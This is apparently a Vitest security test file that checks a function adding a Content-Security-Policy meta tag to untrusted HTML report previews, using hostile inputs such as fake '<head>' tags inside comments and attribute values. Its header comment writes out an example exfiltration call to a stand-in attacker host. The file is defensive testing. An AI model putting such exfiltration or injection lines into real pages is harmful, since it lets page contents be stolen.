/**
 * @license
 * Copyright 2026 Ferrox Labs
 * SPDX-License-Identifier: Apache-2.0
 */

// @vitest-environment jsdom

/**
 * H13. The CSP injection point may not be chosen by matching `<head>` in the
 * document BYTES.
 *
 * These bytes are a generated market report quoting third-party data an
 * attacker can influence, so any anchor the attacker can also write is an
 * anchor the attacker can MOVE. A `<head>` inside a comment or inside an
 * attribute VALUE is not a head element at all: injecting there drops the whole
 * policy somewhere the parser never reads as markup, and the real document then
 * renders with no CSP - the one thing standing between a hostile report and
 * `fetch('https://attacker/?d=' + document.body.innerText)`.
 *
 * Every case asserts the same property by PARSING the emitted bytes rather than
 * eyeballing offsets: a meta swallowed by a comment or by an attribute value
 * produces no element node at all, so `parsedPolicyMetas` comes back empty.
 */

import { describe, expect, it } from 'vitest';

import { UNTRUSTED_PREVIEW_CSP, withPreviewCsp } from '@/common/preview/untrustedPreview';

const parsedPolicyMetas = (out: string): Element[] => {
  const doc = new DOMParser().parseFromString(out, 'text/html');
  return Array.from(doc.querySelectorAll('meta[http-equiv]')).filter(
    (node) => node.getAttribute('http-equiv')?.toLowerCase() === 'content-security-policy'
  );
};

describe('withPreviewCsp - the policy cannot be captured by attacker bytes', () => {
  it('is not captured by a <head> inside an HTML COMMENT', () => {
    const hostile = '<!-- <head> --><html><head><title>Brief</title></head><body>x</body></html>';
    const metas = parsedPolicyMetas(withPreviewCsp(hostile));
    expect(metas).toHaveLength(1);
    expect(metas[0].getAttribute('content')).toBe(UNTRUSTED_PREVIEW_CSP);
    expect(metas[0].parentElement?.tagName.toLowerCase()).toBe('head');
  });

  it('is not captured by a <head> inside an ATTRIBUTE VALUE', () => {
    const hostile = '<html data-note="<head>"><head><title>Brief</title></head><body>x</body></html>';
    const metas = parsedPolicyMetas(withPreviewCsp(hostile));
    expect(metas).toHaveLength(1);
    expect(metas[0].getAttribute('content')).toBe(UNTRUSTED_PREVIEW_CSP);
    expect(metas[0].parentElement?.tagName.toLowerCase()).toBe('head');
  });

  it('puts the policy ahead of a script the document opens BEFORE any head', () => {
    const hostile = '<script>window.pwned=1</script><html><head></head><body>x</body></html>';
    const out = withPreviewCsp(hostile);
    expect(out.indexOf('Content-Security-Policy')).toBeLessThan(out.indexOf('<script>'));
    expect(parsedPolicyMetas(out)).toHaveLength(1);
  });

  it('emits exactly one policy element, first in head, when the document has MULTIPLE heads', () => {
    const hostile = '<html><head><title>a</title></head><body>b</body><head><title>c</title></head></html>';
    const metas = parsedPolicyMetas(withPreviewCsp(hostile));
    expect(metas).toHaveLength(1);
    expect(metas[0].parentElement?.tagName.toLowerCase()).toBe('head');
    expect(metas[0].parentElement?.firstElementChild).toBe(metas[0]);
  });

  it('protects a document with NO head at all', () => {
    const metas = parsedPolicyMetas(withPreviewCsp('<html><body>x</body></html>'));
    expect(metas).toHaveLength(1);
    expect(metas[0].parentElement?.tagName.toLowerCase()).toBe('head');
  });

  it('keeps the DOCTYPE first so the document does not fall into quirks mode', () => {
    const out = withPreviewCsp('<!DOCTYPE html><html><head><title>Brief</title></head><body>x</body></html>');
    expect(out.slice(0, 15).toLowerCase()).toBe('<!doctype html>');
    expect(new DOMParser().parseFromString(out, 'text/html').compatMode).toBe('CSS1Compat');
    expect(parsedPolicyMetas(out)).toHaveLength(1);
  });

  it('keeps the DOCTYPE first even behind a leading comment that mentions <head>', () => {
    const hostile = '<!-- <head> --><!DOCTYPE html><html><head><title>Brief</title></head><body>x</body></html>';
    const out = withPreviewCsp(hostile);
    expect(new DOMParser().parseFromString(out, 'text/html').compatMode).toBe('CSS1Compat');
    const metas = parsedPolicyMetas(out);
    expect(metas).toHaveLength(1);
    expect(metas[0].parentElement?.tagName.toLowerCase()).toBe('head');
  });

  it('fails closed on an UNTERMINATED comment - the policy still parses as markup', () => {
    const hostile = '<!-- <head> <html><head><title>Brief</title></head><body>x</body></html>';
    expect(parsedPolicyMetas(withPreviewCsp(hostile))).toHaveLength(1);
  });
});
